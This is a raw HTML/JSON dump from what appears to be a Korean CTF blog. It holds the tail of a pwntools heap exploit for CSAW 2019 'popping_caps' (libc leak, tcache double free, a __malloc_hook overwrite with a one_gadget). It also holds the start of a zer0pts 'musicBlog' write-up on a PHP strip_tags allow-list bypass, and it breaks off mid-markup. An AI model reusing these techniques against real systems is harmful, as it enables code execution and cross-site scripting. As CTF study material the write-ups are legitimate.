property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">libc</span> <span class=\"token expression\"><span class=\"token operator\">=</span> <span class=\"token function\">ELF</span><span class=\"token punctuation\">(</span></span><span class=\"token string\">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span>\n    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">lib</span> <span class=\"token expression\">leak</span></span>\n    <span class=\"token function\">ru</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Here is system \"</span><span class=\"token punctuation\">)</span>\n    lib_system <span class=\"token operator\">=</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">(</span><span class=\"token function\">rn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">strip</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> lib_system<span class=\"token operator\">-</span>e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\n    malloc_hook <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>libc\n    one_gadget <span class=\"token operator\">=</span> libc<span class=\"token operator\">+</span><span class=\"token number\">0x10a45c</span>\n\n    <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libc\"</span><span class=\"token punctuation\">,</span> libc<span class=\"token punctuation\">)</span>\n    <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc_hook\"</span><span class=\"token punctuation\">,</span> malloc_hook<span class=\"token punctuation\">)</span>\n    <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"one_gadget\"</span><span class=\"token punctuation\">,</span> one_gadget<span class=\"token punctuation\">)</span>\n\n    <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3a8</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">0x210</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xf8</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>malloc_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">irt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>one_gadget<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D\">바이너리 분석</a></p>\n</li>\n<li>\n<p><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EC%8B%A4%ED%96%89-%EA%B2%B0%EA%B3%BC\">바이너리 실행 결과</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%B7%A8%EC%95%BD%ED%95%9C-%EB%B6%80%EB%B6%84\">취약한 부분</a></p>\n<ul>\n<li><a href=\"#%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%A3%BC%EC%86%8C-%EB%85%B8%EC%B6%9C\">메모리 주소 노출</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%80%EB%B6%84\">main 함수 부분</a></p>\n</li>\n<li>\n<p><a href=\"#bye-%ED%95%A8%EC%88%98-%EB%B6%80%EB%B6%84\">Bye 함수 부분</a></p>\n</li>\n<li>\n<p><a href=\"#exploit-idea\">Exploit Idea</a></p>\n</li>\n<li>\n<p><a href=\"#exploit-scenario\">Exploit Scenario</a></p>\n</li>\n<li>\n<p><a href=\"#tcache_perthread_struct\">tcache_perthread_struct</a></p>\n</li>\n<li>\n<p><a href=\"#heap-%EC%88%9C%EC%84%9C-%ED%8C%8C%EC%95%85\">heap 순서 파악</a></p>\n</li>\n<li>\n<p><a href=\"#fake-chunk%EB%A5%BC-%EB%A7%8C%EB%93%A4%EA%B8%B0-%EC%9C%84%ED%95%B4-malloc0x3a8-%ED%95%98%EB%8A%94-%EC%9D%B4%EC%9C%A0\">fake chunk를 만들기 위해 malloc(0x3a8) 하는 이유</a></p>\n</li>\n<li>\n<p><a href=\"#integer-issue\">integer issue</a></p>\n</li>\n<li>\n<p><a href=\"#writep64malloc_hook\">write(p64(malloc_hook))</a></p>\n</li>\n</ul>\n</div>","excerpt":"취약점 분석 바이너리 분석 바이너리 실행 결과 lib_system 주소가 노출되는 것을 확인할 수 있으며 4개의 옵션으로 해제 , 할당, 입력, 종료가 가능하다. 취약한 부분 메모리 주소 노출  lib_system 주소를 노출시키는 것을 확인할 수 있다. main 함수 부분  Bye 함수 부분  Exploit Idea 라이브러리 주소가 노출이되어 있기 때문에 해당 바이너리가 7가지 작업 만 수행 할 수 있으므로 작업을 낭비할 필요가 없다. 라이브러리 버전은 2.27 버전이며 tcache를 사용하고 있다. 바이너리 분석 결과 UAF를 직접적으로 가능하지 않기 때문에 tcache poisoning이 불가능 하다. 우리는 Double free buf를 바탕으로 tcache dup을 사용할 수 있다. 힙의 어느 위치에서나 해제가 가능하므로 tcache house of spirit을 사용할 수 있다. security check로 인해 작성하려는 위치에 fake chunk을 만들어야 한다. …","frontmatter":{"date":"September 18, 2020","title":"CSAW 2019 popping_caps 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🍔"},"fields":{"slug":"/csaw_popping_ctf_writeup/"}},"next":{"id":"8b2db8ca-f6eb-549e-abaf-e661c224717d","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<blockquote>\n<p>Name\nmusicBlog</p>\n</blockquote>\n<blockquote>\n<p>Description\nYou can introduce favorite songs to friends with MusicBlog!</p>\n</blockquote>\n<blockquote>\n<p>File\nMusicBlog.tar.gz</p>\n</blockquote>\n<h2 id=\"dockerfile-분석\" style=\"position:relative;\"><a href=\"#dockerfile-%EB%B6%84%EC%84%9D\" aria-label=\"dockerfile 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>DockerFile 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 19.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAApElEQVQI11WOyxKCIABF+RWyCV8ooCgYj/ABOuai//+ZmqnMZs7ibs7cA7wwdlzsuOjeo5xClMFLBlF++hLFOIrxvs9J8SEtwSTtbVpMP2sXlPNCuVY5Lk0ldCU05V1RibLuWKtoc03L+uiDUejer0PYhnkL90cfNufXksucNpi1GeEopzFmCWYxZpeM/J6TAkxMGjsSLiuhCe/ehfC/eedovuQnuIAubUVzg5oAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/0a3dbac156713c43eaf10f4966a02558/37523/0.png\"\n        srcset=\"/static/0a3dbac156713c43eaf10f4966a02558/e9ff0/0.png 180w,\n/static/0a3dbac156713c43eaf10f4966a02558/f21e7/0.png 360w,\n/static/0a3dbac156713c43eaf10f4966a02558/37523/0.png 720w,\n/static/0a3dbac156713c43eaf10f4966a02558/cda19/0.png 785w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>PHP 7.4.0 버전을 사용하는 것을 확인할 수 있으며 해당 버전에 맞는 버그를 바탕으로 flag를 획득할 수 있겠다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\"><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">함수이름</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">await</span> 비동기 처리 메서드 <span class=\"token function\">명</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>함수의  앞에 async 라는 예약어를 붙인후, 함수 내부에서 비동기 처리가 필요한 메서드에 await를 붙여준다.</li>\n<li>await 붙인 메서드는 비동기 처리 메서드가 꼭 promise 객체를 반환해야 await가 의도한 대로 동작한다.</li>\n</ul>\n<h2 id=\"flag-문자열-찾기\" style=\"position:relative;\"><a href=\"#flag-%EB%AC%B8%EC%9E%90%EC%97%B4-%EC%B0%BE%EA%B8%B0\" aria-label=\"flag 문자열 찾기 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>flag 문자열 찾기</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 647px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 73.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsTAAALEwEAmpwYAAABlElEQVQoz41TWW7bMBDVWSJZ3DnDZUhKVGVbdhIj6UfQ+x+mkIy4QRFUBQbE+3nkW4bNQTtuPDe+5ablepsVdMLuTmONN6EqVwSQwMIhCcgc0kHCPtkZp/wkIEssmo7KVxUnFaZe4j6Z22gwaaSOq7aXLVvnqVctN/vk4pLLL0hL9iPRlIbZYLE+9xq7TfkWwZ+LvuKGScx01OPNpkvxQ5qu9GPJZRnGG8SxE1bYwLZEJURuA7dBIXHj72SoLo2rz9m5icI55wvSGfNVAkmIyiWFpLfzjgXEe5xNKyyTOEEM83usP4dySfkI+QTlJJEUbpyN1itk2h0kPIpo7kj5/Pr+UY/PNs7x/AH1VWB5GH74/CvF9WVpQnKJQ2YmKVtUnKTLvbSrVe0lENP+2/CbTiG5vAyX4flXrC8YqsAsgHqFvXafUr/vvOkVSu0YjgyyDZPG0HHz9EXnPwpvhA41L1Bvrr7FcsVysmmmMpk47m7oumGdod4Qh8xt5JC4JQWRbU3ukJl2wnpuXMv058daZf/Pev4G19eflILTS0sAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/e2bdef089c91fc681b0e6f102b39ce14/ca12d/1.png\"\n        srcset=\"/static/e2bdef089c91fc681b0e6f102b39ce14/e9ff0/1.png 180w,\n/static/e2bdef089c91fc681b0e6f102b39ce14/f21e7/1.png 360w,\n/static/e2bdef089c91fc681b0e6f102b39ce14/ca12d/1.png 647w\"\n        sizes=\"(max-width: 647px) 100vw, 647px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>flag 문자열을 검색하여 <code class=\"language-text\">worker.js</code> 소스코드를 확인할 수 있다.</li>\n<li>해당 코드를 보면 재선언, 재할당이 불가능하도록 설정되어 있다. <code class=\"language-text\">zer0pts{&lt;censored>}</code></li>\n<li>setUserAgent 메서드를 바탕으로 flag 값을 UserAgent로 설정하는 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"samplepage\" style=\"position:relative;\"><a href=\"#samplepage\" aria-label=\"samplepage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SamplePage</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAnElEQVQY05WQwQrCMBBE8//f48WvEDxULIKXYtqkm2R3TZqmbSKtoKAXfZcZZi7DiE7rS3W61rV1WErJOZefEWEYjLx5gLsPzIxESMTMtJkXuEHEz9AhjuMoEEkqLbWWbdt2Sum+BzDWGrsCxoIxm1kVAEIIMcYQhnmeRSR0TeNUx947pDGlP2Yv5yrtd8vx8NnkPE1TTO8Tvt94APx4IHEzfMLvAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/00596cc8f493e4b9835a4b479ae36c80/37523/2.png\"\n        srcset=\"/static/00596cc8f493e4b9835a4b479ae36c80/e9ff0/2.png 180w,\n/static/00596cc8f493e4b9835a4b479ae36c80/f21e7/2.png 360w,\n/static/00596cc8f493e4b9835a4b479ae36c80/37523/2.png 720w,\n/static/00596cc8f493e4b9835a4b479ae36c80/302a4/2.png 1080w,\n/static/00596cc8f493e4b9835a4b479ae36c80/0940f/2.png 1154w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAtklEQVQI11XIQZKDIBRFUTdiEhNBQBBRkzLA5wOZdUcH2f9iUtijrjqD+17F9CLMOmgjpO76kfaaMEmYIlxRPhCm2mOW5ooczxFFJRl9zON6XxJCjgHcMyEEcCn4V8KEEINHsME/U/Bg14wQvA3eorfVZX6p/JGwCXibtJv4nvNu4iZx42Hn7oe53/OUa431GOsRTyadShRVtzg2Wd4roqZWDLeOXztxpUVDRUP4uWUXwpu/+d8XcDEuHZRrDg0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/a489223691495c1859e583ade462be8c/37523/3.png\"\n        srcset=\"/static/a489223691495c1859e583ade462be8c/e9ff0/3.png 180w,\n/static/a489223691495c1859e583ade462be8c/f21e7/3.png 360w,\n/static/a489223691495c1859e583ade462be8c/37523/3.png 720w,\n/static/a489223691495c1859e583ade462be8c/4ff83/3.png 843w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Sample Page 분석시 <code class=\"language-text\">&lt;audio></code> 태그를 사용하여 post 올릴 수 있는것으로 추정된다.</li>\n</ul>\n<h2 id=\"postphp-분석\" style=\"position:relative;\"><a href=\"#postphp-%EB%B6%84%EC%84%9D\" aria-label=\"postphp 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>post.php 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.555555555555555%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAkElEQVQI1xXECwqDMAwAUO8yZTZNTRPT9KMyHToGu/99hvB4HWrWZadyhLRBEIcykrqoQAbSgBtw8WwgCdmeyAPEAWjw1MPUhVKv1/k7PrqdtH9lObxUzxlk9mReKnB13CBWZCNtODcvFlJ2UbtgZV2v2t6oC6YFpIxBHRkEczG7mDEmjAlIB5geY+jddBvv/6QxIs2tAmPZAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/e8fc8e56599ca66f4683b7ce6a13c294/37523/4.png\"\n        srcset=\"/static/e8fc8e56599ca66f4683b7ce6a13c294/e9ff0/4.png 180w,\n/static/e8fc8e56599ca66f4683b7ce6a13c294/f21e7/4.png 360w,\n/static/e8fc8e56599ca66f4683b7ce6a13c294/37523/4.png 720w,\n/static/e8fc8e56599ca66f4683b7ce6a13c294/2e367/4.png 1066w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>post를 게시할 때 문자열 필터링을 하는 부분이 존재한다. 해당 부분은 <code class=\"language-text\">render_tags</code> 함수를 바탕으로 제어된다.</li>\n</ul>\n<h2 id=\"utilphp-분석\" style=\"position:relative;\"><a href=\"#utilphp-%EB%B6%84%EC%84%9D\" aria-label=\"utilphp 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>util.php 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.333333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAiklEQVQI10WMUQqEMAwFvYupJq1pm1St1iLKfi57/+ssXT8WhseDgemW+SjHlY9b1mLDjCGBDcaJcQI2GhsHp4OTcZLBBvMDqG1P3K37S89Pvt5Sq9bb593GzS8nL3VKBUMmLSQba6aQkBNyayErsnZR1pHT0wMnhgKQB/I9sSEG4h7/APJjgdr/AgT/IHmi3V1aAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/8046a8f895df08c0204b5a3ac048eeea/37523/5.png\"\n        srcset=\"/static/8046a8f895df08c0204b5a3ac048eeea/e9ff0/5.png 180w,\n/static/8046a8f895df08c0204b5a3ac048eeea/f21e7/5.png 360w,\n/static/8046a8f895df08c0204b5a3ac048eeea/37523/5.png 720w,\n/static/8046a8f895df08c0204b5a3ac048eeea/146da/5.png 943w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">redner_tags</code> 함수는 util.php에 구현되어 있으며 사용자의 입력값을 인자로 받아와 <code class=\"language-text\">preg_replace</code> 함수를 바탕으로,</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\[\\[(.+?)\\]\\]/'</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string single-quoted-string\">'&lt;audio controls src=\"\\\\1\">&lt;/audio>'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'[[www.naver.com]]'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token operator\">=></span>\n<span class=\"token operator\">&lt;</span>audio controls src<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"www.naver.com\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>audio<span class=\"token operator\">></span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">[[URL]]</code> 정규화를 바탕으로 <code class=\"language-text\">&lt;audio></code> 치환되는 모습을 확인할 수 있다</li>\n<li>두번 째 필터로는 <code class=\"language-text\">strip_tags</code> 함수로 <code class=\"language-text\">&lt;audio></code> 태그를 정확히 써야 허용되는 메서드이다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token function\">strip_tags</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;audio>'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'&lt;audio>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// => allows</span>\n<span class=\"token function\">strip_tags</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;script>'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'&lt;audio>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// => Deny</span></code></pre></div>\n<ul>\n<li>하지만 두 번째 필터링 부분에서 PHP 버그가 발생한다.</li>\n</ul>\n<h2 id=\"strip_tags-allows--in-tag-name-allowing-whitelist-bypass-in-browsers\" style=\"position:relative;\"><a href=\"#strip_tags-allows--in-tag-name-allowing-whitelist-bypass-in-browsers\" aria-label=\"strip_tags allows  in tag name allowing whitelist bypass in browsers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>strip_tags allows / in tag name, allowing whitelist bypass in browsers</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 64.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAABaElEQVQoz52R2W7sIBBE/f+/N9JEfohNGC9hWIwB06wmws5kUXR1o5QQagkO1dU03fNwvWKEbhjjlxdMCBnGqe961KO+Rxjj10NKKQs2hJBzLg81wXvO7tM8rmrdtg3AGqOHYcDo9TbwEGIphXPetm3XdQgha20pZd/3ClNKEcLDQIwBgGhtMAYIIeM4GVOtYozGGKWU1npdVwAIDzXzPCF0v1zmp6fpcrldr1PbjotUMYTDYP/a5+mZH2oE58aoFL0PYK1xrnautQZwpZS8f17++VCFKWVyVXJdtdLOOYBzgXPOeR+8d+4sPQCcad9hpSom5SqXZRGiJjuy6aNyzoVY43l/pIxx/+rMGJ3nidyJEILXLijnXAjBKBNioXUXjLM7oYxxpdQ3WEqptD7DHAf7Yy57Lffy8TE/1VhrQ4gppxhjSinnnFIqv1PNvCzLZjd4n0pwzv8W9t6nlP7V2H/gc0gA8Af4DfEz8CgKnPuHAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        